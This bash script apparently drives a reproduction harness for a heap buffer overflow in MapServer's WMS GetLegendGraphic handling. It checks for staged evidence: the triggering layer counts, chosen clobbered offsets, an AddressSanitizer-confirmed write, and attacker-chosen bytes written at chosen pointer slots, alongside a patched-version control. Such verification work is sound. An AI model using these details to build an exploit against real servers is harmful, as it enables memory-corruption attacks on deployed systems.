#!/usr/bin/env bash
# Driver for the MapServer WMS GetLegendGraphic CVE-2026-77326 extracted harness.
# Verifies rungs 1/2/3, chosen-value control (rung 4 in the extracted harness),
# the rel-8-6-5 fixed control, and determinism. Exits 0 only when all checks pass.
set -u
cd "$(dirname "$0")" || exit 2

CC=${CC:-gcc}
CFLAGS="-O0 -g -Wall -Wextra"
BIN=./legend_layer_overflow
ASAN=./legend_layer_overflow_asan

fail=0
check() {
  if eval "$2"; then
    echo "PASS $1"
  else
    echo "FAIL $1"
    fail=1
  fi
}

# --- compile -------------------------------------------------------------
$CC $CFLAGS -o "$BIN" legend_layer_overflow.c || exit 2
$CC $CFLAGS -fsanitize=address -fno-omit-frame-pointer -o "$ASAN" \
  legend_layer_overflow.c || exit 2
r1=$($BIN rung1)
echo "$r1"
check "rung1 write extent" \
  "printf '%s' \"\$r1\" | grep -q 'oob_appends=94 oob_writes=188 first_oob=100 last_oob=193'"
check "rung1 parsed count and layers seen" \
  "printf '%s' \"\$r1\" | grep -q 'K=95 parsed=99 logical_cap=100'"
check "rung1 trigger verdict" \
  "printf '%s' \"\$r1\" | grep -q 'layers_seen=95 verdict=TRIGGER'"

# --- rung 2: LAYER count chooses clobbered offsets ------------------------
r2=$($BIN rung2)
echo "$r2"
check "rung2 K=95 clobbers first stamp" \
  "printf '%s' \"\$r2\" | grep -q 'K=95 parsed=99 cap=100 final=194 oob_appends=94 oob_writes=188 stampA_clobbered=1 stampB_clobbered=0'"
check "rung2 K=97 blind spot after realloc" \
  "printf '%s' \"\$r2\" | grep -q 'K=97 parsed=101 cap=200 final=198 oob_appends=0 oob_writes=0 stampA_clobbered=0 stampB_clobbered=0'"
check "rung2 K=195 clobbers both stamps" \
  "printf '%s' \"\$r2\" | grep -q 'K=195 parsed=199 cap=200 final=394 oob_appends=194 oob_writes=388 stampA_clobbered=1 stampB_clobbered=1'"
check "rung2 K=197 blind spot after second doubling" \
  "printf '%s' \"\$r2\" | grep -q 'K=197 parsed=201 cap=400 final=398 oob_appends=0 oob_writes=0 stampA_clobbered=0 stampB_clobbered=0'"
check "rung2 verdict" \
  "printf '%s' \"\$r2\" | grep -q 'verdict=LAYER_COUNT_CONTROL_OBSERVED'"

# --- rung 3: ASan-confirmed corruption ------------------------------------
r3log=$(mktemp)
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 "$ASAN" rung3 >"$r3log" 2>&1
r3rc=$?
echo "rung3 rc=$r3rc"
grep -E 'mode=rung3|ERROR: AddressSanitizer|WRITE of size|after 800-byte|wms_dispatch_legend|SUMMARY: AddressSanitizer' "$r3log" | head -20
check "rung3 nonzero exit" "test $r3rc -ne 0"
check "rung3 ASan heap-buffer-overflow" \
  "grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' \"$r3log\""
check "rung3 is a WRITE of size 8" "grep -q 'WRITE of size 8' \"$r3log\""
check "rung3 after 800-byte region" \
  "grep -q '0 bytes after 800-byte region' \"$r3log\""
check "rung3 in wms_dispatch_legend" "grep -q 'wms_dispatch_legend' \"$r3log\""
rm -f "$r3log"

# --- rung 4: attacker-chosen value bytes at chosen pointer slots ----------
r4=$($BIN rung4)
echo "$r4"
check "rung4 slot 110 chosen value" \
  "printf '%s' \"\$r4\" | grep -q 'slot=110 byte_offset=880 value=bytes=44 45 41 44 42 45 45 46 43 41 46 45 42 41 42 45'"
check "rung4 slot 150 chosen value" \
  "printf '%s' \"\$r4\" | grep -q 'slot=150 byte_offset=1200 value=bytes=44 45 41 44 42 45 45 46 43 41 46 45 42 41 42 45'"
check "rung4 slot 190 chosen value" \
  "printf '%s' \"\$r4\" | grep -q 'slot=190 byte_offset=1520 value=bytes=44 45 41 44 42 45 45 46 43 41 46 45 42 41 42 45'"
check "rung4 count and source" \
  "printf '%s' \"\$r4\" | grep -q 'chosen_bytes_written=48 offsets_exact=1 value_source=layer_query_values'"
check "rung4 verdict" \
  "printf '%s' \"\$r4\" | grep -q 'verdict=CHOSEN_BYTES_AT_CHOSEN_OFFSETS'"

# --- fixed control (rel-8-6-5 / a7d5eb8 + ea1d87a) ------------------------
rf=$($BIN fixed)
echo "$rf"
check "fixed control clean" \
  "printf '%s' \"\$rf\" | grep -q 'oob_writes=0 layers_seen=95 stamps_intact=2 verdict=PASS'"
fflog=$(mktemp)
ASAN_OPTIONS=detect_leaks=0 "$ASAN" fixed >"$fflog" 2>&1
ffrc=$?
echo "fixed_asan rc=$ffrc"
check "fixed ASan clean" "test $ffrc -eq 0"
check "fixed ASan no report" \
  "! grep -q 'ERROR: AddressSanitizer' \"$fflog\""
rm -f "$fflog"

# --- determinism ----------------------------------------------------------
digest_a=$(for i in 1 2 3 4 5; do
  $BIN rung1
  $BIN rung2
  $BIN rung4
  $BIN fixed
done | sha256sum | cut -d' ' -f1)
digest_b=$(for i in 1 2 3 4 5; do
  $BIN rung1
  $BIN rung2
  $BIN rung4
  $BIN fixed
done | sha256sum | cut -d' ' -f1)
echo "sha256=$digest_a sha256_b=$digest_b (two independent 5-run groups)"
check "determinism two 5-run groups identical" \
  "test \"\$digest_a\" = \"\$digest_b\""

if test "$fail" -eq 0; then
  echo "ALL CHECKS PASS rc 0"
  exit 0
fi
echo "SOME CHECKS FAILED rc 1"
exit 1
